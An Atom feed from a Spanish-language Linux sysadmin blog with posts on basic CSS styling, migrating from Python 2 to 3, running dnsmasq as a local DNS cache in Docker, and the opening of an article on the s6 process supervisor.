<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Linux Sysadmin</title><link href="http://www.linuxsysadmin.ml/" rel="alternate"></link><link href="http://www.linuxsysadmin.ml/feeds/all.atom.xml" rel="self"></link><id>http://www.linuxsysadmin.ml/</id><updated>2018-10-16T10:00:00+02:00</updated><entry><title>Trucos simples de CSS para que tu página se vea aceptable</title><link href="http://www.linuxsysadmin.ml/2018/10/trucos-simples-de-css-para-que-tu-pagina-se-vea-aceptable.html" rel="alternate"></link><published>2018-10-16T10:00:00+02:00</published><updated>2018-10-16T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-10-16:/2018/10/trucos-simples-de-css-para-que-tu-pagina-se-vea-aceptable.html</id><summary type="html">&lt;p&gt;Todos estamos hartos de ver páginas web con distracciones por todos lados: anuncios, &lt;em&gt;popups&lt;/em&gt;, menús desplegables y horribles &lt;em&gt;scripts&lt;/em&gt; de &lt;em&gt;javascript&lt;/em&gt;. Eso hace que el contenido no llegue al usuario final y por lo tanto, no se queden con ganas de volver. Eso no significa tener una página HTML básica …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Todos estamos hartos de ver páginas web con distracciones por todos lados: anuncios, &lt;em&gt;popups&lt;/em&gt;, menús desplegables y horribles &lt;em&gt;scripts&lt;/em&gt; de &lt;em&gt;javascript&lt;/em&gt;. Eso hace que el contenido no llegue al usuario final y por lo tanto, no se queden con ganas de volver. Eso no significa tener una página HTML básica.&lt;/p&gt;
&lt;p&gt;Para aquellas páginas que estén más interesadas en ser leídas que en aportar beneficios, no se necesita nada de esto; la simplicidad en estos casos es un plus: no se necesita prácticamente nada más que títulos, párrafos e imágenes.&lt;/p&gt;
&lt;p&gt;Todos sabemos que una página web que solo use &lt;em&gt;tags&lt;/em&gt; de HTML, no es atractiva visualmente, pero está libre de distracciones completamente. Podemos ver &lt;a href="/2018/10/trucos-simples-de-css-para-que-tu-pagina-se-vea-aceptable/css_basic_skeleton.html"&gt;un ejemplo&lt;/a&gt; de este tipo de páginas.&lt;/p&gt;
&lt;p&gt;A partir de este esqueleto, se puede complicar el diseño tanto como queramos, hasta llegar a la ilegibilidad. Sin embargo, hay un punto medio que se puede conseguir con pocos conocimientos de CSS y, aún así, dar sensación de profesionalidad y de simpleza buscada adrede. Para los impacientes, podemos ver el resultado &lt;a href="/2018/10/trucos-simples-de-css-para-que-tu-pagina-se-vea-aceptable/css_basic_styled.html"&gt;aquí&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Centrar el contenido&lt;/h2&gt;
&lt;p&gt;Lo primero que se nota es una sensación de agobio: nos faltan márgenes a ambos lados del texto. Podemos limitar el contenido a un ancho máximo, de forma que se vea espacio en las pantallas grandes, pero no se desperdicie en pantallas más pequeñas. Luego podemos dejar qu se calcule el margen de forma automática.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="k"&gt;max-width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;800&lt;/span&gt;&lt;span class="kt"&gt;px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;margin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;auto&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Cambiar la fuente del texto&lt;/h2&gt;
&lt;p&gt;La fuente por defecto que llevan los navegadores es poco agradable a la vista; con cambiar la fuente es suficiente. Podemos poner una fuente propia, una de &lt;strong&gt;Google Fonts&lt;/strong&gt; o simplemente usar una família para que el navegador utilize la que le venga en gana.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="k"&gt;font-family&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;sans-serif&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadir un toque de color&lt;/h2&gt;
&lt;p&gt;Este punto es conflictivo; con elegancia le puede dar a la página mejor aspecto visual, pero rápidamente nos puede cegar o distraer. Personalmente opino que un color pálido le da un punto de color, sin quitarle importancia al contenido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="k"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mh"&gt;#EFE&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Subrayar los títulos&lt;/h2&gt;
&lt;p&gt;Es fácil que los títulos se camuflen entre el contenido, y por eso los queremos remarcar. El uso de &lt;code&gt;text-decoration: underline&lt;/code&gt; no basta: se puede confundir con un enlace. A mí me gustan los subrayados que van de una punta a la otra de la página, y esto se puede simular con el borde inferior del título.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="k"&gt;border-bottom&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;0.1&lt;/span&gt;&lt;span class="kt"&gt;rem&lt;/span&gt; &lt;span class="mh"&gt;#000&lt;/span&gt; &lt;span class="kc"&gt;solid&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Estilizar los párrafos&lt;/h2&gt;
&lt;p&gt;El estilo básico de los párrafos tiene, a mi parecer, dos fallos: los párrafos con "sierras" laterales me distraen y prefiero justificarlos, y el escaso espacio entre líneas los hace ilegibles. Podemos corregir ambos con reglas simples de CSS.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="k"&gt;text-align&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;justify&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;line-height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;1.5&lt;/span&gt;&lt;span class="kt"&gt;rem&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Centrar las imágenes&lt;/h2&gt;
&lt;p&gt;Los elementos de imágenes son interpretados como elementos &lt;em&gt;inline&lt;/em&gt;, y se pueden poner de forma consecutiva en un párrafo o título. Para mí esto no tiene sentido y evita que se puedan centrar. Las imágenes deberían estar solas, para que se lleven el protagonismo para el que las hemos puesto. Un pegote de imágenes no es bonito.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;img&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="k"&gt;display&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;block&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;margin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;auto&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Otros elementos&lt;/h2&gt;
&lt;p&gt;La clave para no complicar más el diseño es no estilizar aquello que no necesitemos. Sin embargo, algunos tipos de contenido pueden necesitar otros tipos de elementos HTML, como las listas, citaciones o código; seguro que váis a querer estilizar enlaces, cursivas y negritas.&lt;/p&gt;
&lt;p&gt;El único consejo que os puedo dar es el de no recargar: quitar el subrayado o el cambio de color en un enlace es aceptable; cambiar los círculos de las listas por cuadrados es aceptable; poner puntos personalizados con imágenes propias y parpadeantes, no lo es.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Usad la cabeza.&lt;/strong&gt;&lt;/p&gt;</content><category term="CSS"></category><category term="básico"></category></entry><entry><title>He acabado migrando de python 2 a 3</title><link href="http://www.linuxsysadmin.ml/2018/10/he-acabado-migrando-de-python-2-a-3.html" rel="alternate"></link><published>2018-10-08T10:00:00+02:00</published><updated>2018-10-08T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-10-08:/2018/10/he-acabado-migrando-de-python-2-a-3.html</id><summary type="html">&lt;p&gt;He sido fan de &lt;strong&gt;python&lt;/strong&gt; desde hace muchos años. Inicialmente lo empecé a utilizar porque, junto a &lt;strong&gt;bash&lt;/strong&gt;, era la herramienta que venía por defecto en todos los servidores que administraba. Pero con el tiempo salió la versión 3, incompatible con la 2; al final me ha tocado migrar forzadamente …&lt;/p&gt;</summary><content type="html">&lt;p&gt;He sido fan de &lt;strong&gt;python&lt;/strong&gt; desde hace muchos años. Inicialmente lo empecé a utilizar porque, junto a &lt;strong&gt;bash&lt;/strong&gt;, era la herramienta que venía por defecto en todos los servidores que administraba. Pero con el tiempo salió la versión 3, incompatible con la 2; al final me ha tocado migrar forzadamente.&lt;/p&gt;
&lt;p&gt;La primera versión de &lt;strong&gt;python&lt;/strong&gt; salió en 1991, y la segunda versión se publicó en el año 2000. Cuando salió la versión 3 en el año 2008 se decidieron cambios en el lenguaje que lo hicieron incompatible con al versión 2, mucho más extendida. Como en el 2010 salió la versión 2.7, todos creimos que seguiríamos usando la segunda versión.&lt;/p&gt;
&lt;p&gt;Las librerías existentes en la versión 2 tuvieron que adaptarse para soportar la nueva versión y la antigua, y habiendo cientos de ellas, el proceso encontró una severa resistencia, aunque con el tiempo casi todas las librerías han pasado por el aro.&lt;/p&gt;
&lt;p&gt;Los desarrolladores tardaron todavía más en migrar de versión, puesto que les faltaban las librerías habituales en la nueva versión; en el mundo de sistemas la resistencia fue todavía mayor: casi todas las distribuciones usaban por defecto la versión 2, y los lentos ciclos de lanzamiento de sus versiones no ayudaron a mejorar la situación.&lt;/p&gt;
&lt;p&gt;Yo fuí uno de esos usuarios de &lt;strong&gt;python&lt;/strong&gt; que creían que &lt;strong&gt;python 3&lt;/strong&gt; estaba condenado al fracaso, y me dije a mí mismo que nunca iba a migrar de versión. Los motivos fueron varios:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Los sistemas operativos usaban &lt;strong&gt;python 2&lt;/strong&gt; por defecto, con la notable excepción de &lt;strong&gt;ArchLinux&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Algunas de las herramientas de sistemas, como &lt;strong&gt;fabric&lt;/strong&gt; o &lt;strong&gt;ansible&lt;/strong&gt; carecían de soporte para &lt;strong&gt;python 3&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;El código &lt;em&gt;legacy&lt;/em&gt; de mi sitio de trabajo seguía en &lt;strong&gt;python 2&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Algunos proyectos necesitaban de librerías o &lt;em&gt;frameworks&lt;/em&gt; que no estaban portados, como &lt;strong&gt;django&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Me equivocaba&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;La fecha de jubilación de &lt;strong&gt;python 2&lt;/strong&gt; ha llegado; la versión 2.7 era solamente un intento de acercar gramáticas hacia la versión 3. El final de la segunda versión es inapelable, con incluso &lt;a href="https://pythonclock.org/"&gt;un contador de marcha atrás&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Si hay que elegir una versión, en &lt;a href="https://wiki.python.org/moin/Python2orPython3"&gt;el sitio web&lt;/a&gt; son claros:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Python 2.x is legacy, Python 3.x is the present and future of the language  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Todos los puntos que me aferraban a la segunda versión se están diluyendo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Aunque los sistemas operativos siguen teniendo la versión 2 por defecto, pero:&lt;ul&gt;
&lt;li&gt;El modelo de trabajo con contenedores nos desacopla de las necesidades del sistema principal&lt;/li&gt;
&lt;li&gt;Siempre hay un servicio que necesita la 3; esto nos proporciona ambas versiones&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Todas las herramientas necesarias para un DevOps soportan &lt;strong&gt;python 3&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;En mi nuevo trabajo no se desarrolla en &lt;strong&gt;python&lt;/strong&gt;, y en las compañías que lo hacen, se migra controladamente utilizando contenedores&lt;/li&gt;
&lt;li&gt;Las librerías y &lt;em&gt;frameworks&lt;/em&gt; principales ya funcionan en &lt;strong&gt;python 3&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Django&lt;/strong&gt; lo soporta desde la versión 1.5&lt;/li&gt;
&lt;li&gt;Solamente un puñado de librerías &lt;a href="https://python3wos.appspot.com/"&gt;no han sido portadas&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Las grandes compañías (&lt;strong&gt;Google&lt;/strong&gt;, &lt;strong&gt;Facebook&lt;/strong&gt;, &lt;strong&gt;Instagram&lt;/strong&gt;...) han apostado fuerte por la nueva versión, que no para de recibir mejoras de rendimiento y funcionalidad. Visto el panorama, he decidido migrar yo también todas mis imágenes y proyectos a &lt;strong&gt;python 3&lt;/strong&gt; antes de que sea tarde para hacerlo. &lt;strong&gt;Es el momento&lt;/strong&gt;.&lt;/p&gt;</content><category term="python"></category><category term="migración"></category></entry><entry><title>DNSmasq como una utilidad de cache DNS local usando Docker</title><link href="http://www.linuxsysadmin.ml/2018/10/dnsmasq-como-una-utilidad-de-cache-dns-local-usando-docker.html" rel="alternate"></link><published>2018-10-01T10:00:00+02:00</published><updated>2018-10-01T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-10-01:/2018/10/dnsmasq-como-una-utilidad-de-cache-dns-local-usando-docker.html</id><summary type="html">&lt;p&gt;Ya vimos en otros artículos lo fácilmente que podemos utilizar &lt;strong&gt;dnsmasq&lt;/strong&gt; en un &lt;em&gt;gateway&lt;/em&gt; para ayudar a los servidores a que se conozcan entre sí por nombre y como una forma de ocultar el DNS real de la red interna. Sin embargo es una caché excelente para un sistema aislado …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya vimos en otros artículos lo fácilmente que podemos utilizar &lt;strong&gt;dnsmasq&lt;/strong&gt; en un &lt;em&gt;gateway&lt;/em&gt; para ayudar a los servidores a que se conozcan entre sí por nombre y como una forma de ocultar el DNS real de la red interna. Sin embargo es una caché excelente para un sistema aislado.&lt;/p&gt;
&lt;p&gt;Cualquier sistema, sea un servidor o no, puede utilizar un proceso &lt;strong&gt;dnsmasq&lt;/strong&gt; local como caché y como forma de resolver por nombre entornos que todavia no tienen un DNS disponible en internet. Realmente es un proceso que no consume casi ninguna memoria y nos puede ayudar mucho en caso de una caída del DNS global, o en caso de desconectarnos de la red por cualquier motivo.&lt;/p&gt;
&lt;p&gt;Lo que suele ser problemático es instalarlo en nuestro sistema, por un tema de permisos o de conflictos; en estos casos podemos confiar en convertirlo en un contenedor, que no pasa de los 5mb de disco.&lt;/p&gt;
&lt;h2&gt;La imagen con DNSmasq&lt;/h2&gt;
&lt;p&gt;La imagen en sí misma no oculta ninguna complicación; se trata de instalar &lt;strong&gt;dnsmasq&lt;/strong&gt; en nuestro sistema base y asegurarnos que ejectua en &lt;em&gt;foreground&lt;/em&gt;. Para evitar una imagen muy grande, podemos utilizar &lt;strong&gt;Alpine Linux&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/dnsmasq$ cat build/Dockerfile
FROM alpine:3.8
RUN apk add --no-cache dnsmasq
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/sbin/dnsmasq&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-k&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@atlantis:~/workspace/dnsmasq$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para construir y levantar el servicio, podemos utilizar &lt;strong&gt;docker-compose&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/dnsmasq$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  dnsmasq:
    image: dnsmasq
    build: build
    container_name: dnsmasq
    hostname: dnsmasq
    cap_add:
      - NET_ADMIN
    network_mode: host
    restart: always
    volumes:
      - ./hosts:/etc/hosts:ro
gerard@atlantis:~/workspace/dnsmasq$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/dnsmasq$ docker-compose build
Building dnsmasq
...
Successfully tagged dnsmasq:latest
gerard@atlantis:~/workspace/dnsmasq$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
...
dnsmasq             latest              b43fd1b79394        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       &lt;span class="m"&gt;4&lt;/span&gt;.76MB
...
gerard@atlantis:~/workspace/dnsmasq$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos nuestra imagen.&lt;/p&gt;
&lt;h2&gt;Ejecutando el contenedor&lt;/h2&gt;
&lt;p&gt;Como decisión de diseño, he preferido montar el fichero &lt;code&gt;/etc/hosts&lt;/code&gt; desde una carpeta local, para poder modificarlo a placer y sin tener permisos de superusuario.&lt;/p&gt;
&lt;p&gt;Levantamos el servicio encima de la red local; de esta forma, crearemos la ilusión de que &lt;strong&gt;dnsmasq&lt;/strong&gt; corre en la misma máquina que la va a utilizar directamente en &lt;em&gt;localhost&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: &lt;strong&gt;dnsmasq&lt;/strong&gt; utiliza algunas operaciones especiales de redes. Podéis ejecutar en modo privilegiado (&lt;code&gt;--privileged&lt;/code&gt;) o podéis darle la &lt;em&gt;capability&lt;/em&gt; &lt;code&gt;NET_ADMIN&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/dnsmasq$ docker-compose up -d
Creating dnsmasq ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@atlantis:~/workspace/dnsmasq$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos el servicio &lt;strong&gt;dnsmasq&lt;/strong&gt; accesible desde nuestro servidor, en el puerto estándar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/dnsmasq$ ss -lnt &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="m"&gt;53&lt;/span&gt;
LISTEN     &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;32&lt;/span&gt;           *:53                       *:*
LISTEN     &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;32&lt;/span&gt;          :::53                      :::*
gerard@atlantis:~/workspace/dnsmasq$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Utilizando el nuevo servidor DNS&lt;/h2&gt;
&lt;p&gt;Solo falta indicar que el servidor DNS que nuestra máquina debe utilizar es &lt;em&gt;localhost&lt;/em&gt; en &lt;code&gt;/etc/resolv.conf&lt;/code&gt;, posiblemente seguido de otros. De esta forma, la primera petición DNS fallará, se irá a buscar en el siguiente servidor, y se guardará en &lt;em&gt;caché&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/dnsmasq$ cat /etc/resolv.conf
domain ...
search ...
nameserver &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1
nameserver ...
nameserver ...
gerard@atlantis:~/workspace/dnsmasq$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En el caso de utilizar DHCP para obtener dirección IP automáticamente, el fichero &lt;code&gt;/etc/resolv.conf&lt;/code&gt; se sobreescribe con lo que nos pase el &lt;em&gt;router&lt;/em&gt;. Podemos instruir al cliente de DHCP para que siempre nos añada &lt;em&gt;localhost&lt;/em&gt; en el fichero (es lo que tuve que hacer yo).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/dnsmasq$ cat /etc/dhcp/dhclient.conf 
...
prepend domain-name-servers &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="p"&gt;;&lt;/span&gt;
gerard@atlantis:~/workspace/dnsmasq$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Probando el servidor DNS&lt;/h2&gt;
&lt;p&gt;El paso más interesante de este &lt;em&gt;setup&lt;/em&gt; es la capacidad de &lt;em&gt;cachear&lt;/em&gt; las peticiones DNS, y esto lo podemos probar haciendo simplemente varias peticiones:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@atlantis:~# dig www.linuxsysadmin.ml
...
&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;30&lt;/span&gt; msec
&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1#53&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
...
root@atlantis:~# dig www.linuxsysadmin.ml
...
&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;0&lt;/span&gt; msec
&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1#53&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
...
root@atlantis:~# dig www.linuxsysadmin.ml
...
&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;0&lt;/span&gt; msec
&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1#53&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
...
root@atlantis:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemo ver claramente dos cosas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Estamos utilizando nuestro servidor local DNS&lt;/li&gt;
&lt;li&gt;La primera petición no está en &lt;em&gt;caché&lt;/em&gt; y tarda un poco, pero el resto son inmediatas&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La otra funcionalidad que ganamos con &lt;strong&gt;dnsmasq&lt;/strong&gt; es la de resolver nombres desde el fichero &lt;code&gt;/etc/hosts&lt;/code&gt; del contenedor. Para evitarme modificar sistemas de ficheros privilegiados, el &lt;em&gt;docker-compose.yml&lt;/em&gt; añade este fichero desde un fichero local, que podemos modificar a placer segun nuestros gustos (no os olvidéis de reiniciar el contenedor para que pille los cambios).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/dnsmasq$ cat hosts
&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 test.api.local
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3 auth.api.private
gerard@atlantis:~/workspace/dnsmasq$ docker-compose restart
Restarting dnsmasq ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@atlantis:~/workspace/dnsmasq$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto podemos resolver dominios que no existen fuera de nuestra red, con la comodidad de hacerlo por nombre, y sin modificar direcciones IP si los recolocamos en otros servidores.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@atlantis:~# dig test.api.local +short
&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1
root@atlantis:~# dig auth.api.private +short
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
root@atlantis:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya podemos decir que lo tenemos todo funcionando.&lt;/p&gt;</content><category term="dnsmasq"></category><category term="docker"></category></entry><entry><title>Un contenedor multiservicio con docker y s6</title><link href="http://www.linuxsysadmin.ml/2018/09/un-contenedor-multiservicio-con-docker-y-s6.html" rel="alternate"></link><published>2018-09-24T10:00:00+02:00</published><updated>2018-09-24T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-09-24:/2018/09/un-contenedor-multiservicio-con-docker-y-s6.html</id><summary type="html">&lt;p&gt;Lo he vuelto a hacer: a pesar de que es una antipráctica de &lt;strong&gt;docker&lt;/strong&gt;, me veo tentado a ejecutar varios servicios en mis contenedores. Solo lo hago cuando estos servicios tienen un objetivo común, como servir PHP (nginx/php-fpm); para ello necesitamos un gestor de procesos. Hoy hablaremos de &lt;strong&gt;s6 …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Lo he vuelto a hacer: a pesar de que es una antipráctica de &lt;strong&gt;docker&lt;/strong&gt;, me veo tentado a ejecutar varios servicios en mis contenedores. Solo lo hago cuando estos servicios tienen un objetivo común, como servir PHP (nginx/php-fpm); para ello necesitamos un gestor de procesos. Hoy hablaremos de &lt;strong&gt;s6&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Hasta ahora, el servicio que utilizaba era &lt;a href="http://www.linuxsysadmin.ml/2017/03/multiples-servicios-en-un-mismo-contenedor-docker.html"&gt;runit&lt;/a&gt;, pero existe un servicio similar llamado &lt;strong&gt;s6&lt;/strong&gt; que además sirve como &lt;a href="http://www.linuxsysadmin.ml/2017/09/un-proceso-inicial-para-docker-tini-y-dumb-init.html"&gt;&lt;em&gt;init&lt;/em&gt; correcto&lt;/a&gt; para &lt;strong&gt;docker&lt;/strong&gt;. Por supuesto, no he podido resistir la tentación de darle un intento, y el resultado me ha gustado.&lt;/p&gt;
&lt;h2&gt;Funcionamiento de s6&lt;/h2&gt;
&lt;p&gt;Cuando ejecutamos &lt;strong&gt;s6&lt;/strong&gt;, ejecutamos el binario &lt;code&gt;s6-svscan&lt;/code&gt; que monitoriza una carpeta concreta. En esta carpeta tenemos una subcarpeta por servicio; cada subcarpeta es la definición de un servicio y &lt;code&gt;s6-svscan&lt;/code&gt; va a lanzar sobre la misma el proceso &lt;code&gt;s6-supervise&lt;/code&gt;, que se encarga de mantener ese proceso concreto.&lt;/p&gt;
&lt;p&gt;Esta subcarpeta tiene 3 tipos de ficheros y carpetas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Obligatoriamente un binario, enlace o &lt;em&gt;script&lt;/em&gt; llamado &lt;code&gt;run&lt;/code&gt;, que es lo que se ejecutará para levantar el servicio&lt;/li&gt;
&lt;li&gt;Opcionalmente un binario, enlace o &lt;em&gt;script&lt;/em&gt; llamado &lt;code&gt;finish&lt;/code&gt;, que se llamará cuando el servicio acabe por cualquier motivo&lt;/li&gt;
&lt;li&gt;Carpetas &lt;code&gt;event&lt;/code&gt; y &lt;code&gt;status&lt;/code&gt; que son efímeras y las usa &lt;strong&gt;s6&lt;/strong&gt; para mantener el estado del proceso&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Adicionalmente, la carpeta de servicios tiene un "servicio" especial: &lt;code&gt;.s6-svscan&lt;/code&gt; que dispone de dos binarios, enalces o &lt;em&gt;scripts&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;finish&lt;/code&gt; &amp;rarr; se va a ejecutar cuando &lt;code&gt;s6-svscan&lt;/code&gt; acaba por la causa que sea (es opcional, pero salta un &lt;em&gt;warning&lt;/em&gt; si no lo encuentra)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;crash&lt;/code&gt; &amp;rarr; se ejecuta si el proceso &lt;code&gt;s6-svscan&lt;/code&gt; acaba anormalmente, y es opcional&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Por lo tanto, un &lt;em&gt;setup&lt;/em&gt; típico incluye crear &lt;code&gt;.s6-svscan/finish&lt;/code&gt; y varios &lt;code&gt;&amp;lt;servicio&amp;gt;/run&lt;/code&gt;. Con esto es suficiente.&lt;/p&gt;
&lt;h2&gt;Un ejemplo: contenedor con servidor web y SFTP&lt;/h2&gt;
